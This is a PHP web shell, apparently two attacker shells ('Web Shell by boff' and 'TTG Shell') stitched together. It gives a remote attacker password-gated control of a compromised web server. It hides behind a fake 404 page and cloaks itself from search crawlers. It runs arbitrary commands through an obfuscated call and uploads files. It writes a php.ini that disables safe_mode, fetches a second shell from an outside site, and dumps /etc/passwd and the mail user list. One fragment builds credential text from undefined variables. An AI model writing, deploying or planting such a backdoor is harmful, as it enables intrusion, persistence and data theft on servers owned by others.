<?php # Web Shell by boff

$auth_pass = "e48e13207341b6bffb7fb1622282247b";  // pass : 1337
$color = "#00ff00"; 
$default_action = 'FilesMan'; 
@define('SELF_PATH', __FILE__); 
if( strpos($_SERVER['HTTP_USER_AGENT'],'Google') !== false ) { 
    header('HTTP/1.0 404 Not Found'); 
    exit; 
} 
@session_start(); 
@error_reporting(0); 
@ini_set('error_log',NULL); 
@ini_set('log_errors',0); 
@ini_set('max_execution_time',0); 
@set_time_limit(0); 
@set_magic_quotes_runtime(0); 
@define('VERSION', '2.1'); 
if( get_magic_quotes_gpc() ) { 
    function stripslashes_array($array) { 
        return is_array($array) ? array_map('stripslashes_array', $array) : stripslashes($array); 
    } 
    $_POST = stripslashes_array($_POST); 
} 
function printLogin() { 
    ?> 
<h1>Not Found</h1> 
<p>The requested URL was not found on this server.</p> 
<hr> 
<address>Apache Server at <?=$_SERVER['HTTP_HOST']?> Port 80</address> 
    <style> 
        input { margin:0;background-color:#fff;border:1px solid #fff; } 
    </style> 
    <center> 
    <form method=post> 
    <input type=password name=pass> 
    </form></center> 
    <?php 
    exit; 
} 
if( !isset( $_SESSION[md5($_SERVER['HTTP_HOST'])] )) 
    if( empty( $auth_pass ) || 
        ( isset( $_POST['pass'] ) && ( md5($_POST['pass']) == $auth_pass ) ) ) 
        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true; 
    else 
        printLogin(); 
		
		
 $web = $_SERVER["HTTP_HOST"];
 $inj = $_SERVER["REQUEST_URI"];
 $body = "Egy_Spider \nUserName: ".htmlspecialchars($tacfgd['uname']) ."\nPassWord:
".htmlspecialchars($tacfgd['pword'])."\nMessage:\n"."\nE-server: ".htmlspecialchars
($_SERVER['REQUEST_URI'])."\nE-server2: ".htmlspecialchars ($_SERVER["SERVER_NAME"])."\n\nIP: 
";
# Web Shell by boff
$auth_pass = "";
$color = "#df5";
$default_action = 'FilesMan';
$default_use_ajax = true;
$default_charset = 'Windows-1251';

if(!empty($_SERVER['HTTP_USER_AGENT'])) {
    $userAgents = array("Google", "Slurp", "MSNBot", "ia_archiver", "Yandex", "Rambler");
    if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
        header('HTTP/1.0 404 Not Found');
        exit;
    }
}
// SHELL 
// Header
$h = '<head>
<meta http-equiv="Content-Language" content="en-us">
<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<title>TTG Shell 404</title>
</head>
<!-- Coded By Dr.KroOoZ !-->
<body text="#FFFFFF" bgcolor="#000000">
<font face="Tahoma">
<!-- Coded By Dr.KroOoZ !-->
</font>
<p align="center" dir="ltr"><b><font size="6" face="Tahoma">[#] !<font color="#C0C0C0"> TTG Shell
</font>! [#]</font></b></p>
<p align="center" dir="ltr"><font face="Tahoma" size="2">--------------------------------------------------------------------</font></p>
';
// Footer
$f = '<p align="center" dir="ltr"><font face="Tahoma" size="2">
--------------------------------------------------------------------</font></p>
<p align="center" dir="ltr"><font face="Tahoma" size="2"><font color="#C0C0C0">Coded By</font> : Dr.KroOoZ |
<font color="#FF0000">Root@TTGSa.Com</font> |~</font></p>
<p align="center" dir="ltr"><font face="Verdana" size="1"><font color="#C0C0C0">TTG Member 
</font>: Dr.KroOoZ 
- NO-QRQR - ZGaRT NeT - R.B.G HaCkeR - Mr.aBu.z7z7 |~</font></p>
<p align="center" dir="ltr"><font face="Verdana" size="1">Home :
<font color="#FF0000">www.ttgsa.com </font></font></p>
<p align="center" dir="ltr"><font face="Verdana" size="1">(c) 
<font color="#C0C0C0">Team The Geniuses</font> 
!</font></p>';
// Echo Header 
echo $h;
// PHP 
// Detalis
$krz = (ini_get ('safe_mode'));
if ($krz ==1)   {
echo "<center><font face='Verdana' size='2'>Safe Mode : <font color='#FF0000'>ON</font></font>";
} else {
echo "<center><font face='Verdana'size='2'>Safe Mode : <font color='#008000'>OFF</font>"; }
$ttg = @ini_get('open_basedir');
if ($ttg or strtolower($ttg) == 'on') {$openbasedir = true; $hopenbasedir = '<center><font color="red">'.$ttg.'</font></center>
';}
else {$openbasedir = false; $hopenbasedir = "<font color='#008000'>OFF</font>";}
echo(' || ');
echo("Open basedir : $hopenbasedir");
echo(' || ');
echo 'Disable functions : ';
if(''==($df=@ini_get('disable_functions'))){echo "<font color='#008000'>NONE</font></font>";}else{echo "<font color='red' face='Verdana' size='2'>$df</font>";}
$free = @diskfreespace($dir);
if (!$free) {$free = 0;}
$all = @disk_total_space($dir);
if (!$all) {$all = 0;}
$used = $all-$free;
$used_percent = @round(100/($all/$free),2);
// Uname 
echo '<b><br><br></b><font face="Verdana" size="2">Uname -a : <font color="#808080">'.php_uname().'</font></font>';
// Main 
echo '<p align="center" dir="ltr"><font face="Verdana" size="2">
&nbsp;| <a href="?a=phpini" style="text-decoration: none"><font color="#FF0000">Create PHP.ini</font></a><font color="#FF0000">
</font>| <a href="?a=get" style="text-decoration: none"><font color="#FF0000">
GetShell</font></a> | <a href="?a=passwd" style="text-decoration: none">
<font color="#FF0000">Passwd</font></a> | 
<a href="?a=usr" style="text-decoration: none"><font color="#FF0000">Users</font></a> | </font></p>
<p align="center" dir="ltr"><font face="Verdana" size="2">&nbsp; | 
<a href="?a=info" style="text-decoration: none"><font color="#FF0000">PHPinfo</font></a> |~';
// Run Command
echo '<p align="center"><font face="Verdana" size="2">Run Command : </font>
<font face="Verdana" size="1">[ <font color="#FF0000">Better See Source</font> ]</font></p>';
print'<form method="POST" >
Command&nbsp; : <input type="text" name="krz" />
<input type="submit" value="Run" name="ttg" />
</form>';
// Code 
$command = $_POST['krz'];
$send = $_POST['ttg'];
$krz = "K64sLknNBQA=";
$ttg = gzinflate(base64_decode($krz));
if ($send) {
print ("\n<!-- Here Result START -->\n\n"); // beter result in source!
$ttg ($command);
print ("\n<!-- END ! -->\n\n"); // beter result in source!
}

// Upload 
echo '<p align="center"><font face="Verdana" size="2">Upload Files : </font></p>';
echo '<center><form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader"></centeR>';
echo '<center><input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form></center>';
if( $_POST['_upl'] == "Upload" ) {
	if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<p align="center"><font face="Verdana" size="1"><font color="#008000">Upload Complate !!!</font><br><br>'; }
	else { echo '<font color="#FF0000">Upload Failed !!!</font><br><br></font></p>'; }
}
// PHP INFO 
if ($_GET[a]=="info"){
phpinfo();
}
// Create php.ini
if ($_GET[a]=="phpini"){
 $File = "php.ini"; 
 $Handle = fopen($File, 'w');
 $Data = "safe_mode = off\n"; 
 fwrite($Handle, $Data); 
 $Data = "disable_functions = NONE\n"; 
 fwrite($Handle, $Data); 
 print "d0n3 !";
 fclose($Handle); 
 }
 // Get Shell 
 if ($_GET[a]=="get"){
$file = file_get_contents('http://www.ttgsa.com/shellz/ly0kha.txt');
$b = fopen('ttg.php', 'w');
fwrite($b,$file);
fclose($b);
print 'Done Shell Name [ ttg.php ] ';
}
// cat passwd 
 if ($_GET[a]=="passwd"){
$output = shell_exec('cat /etc/passwd > passwd.txt');
echo "Done ! Open passwd.txt";
}
// Users 
 if ($_GET[a]=="usr"){
$output = shell_exec('ls /var/mail > users.txt');
echo "Done ! Open users.txt";
}
// Echo Fotter 
echo $f;
?>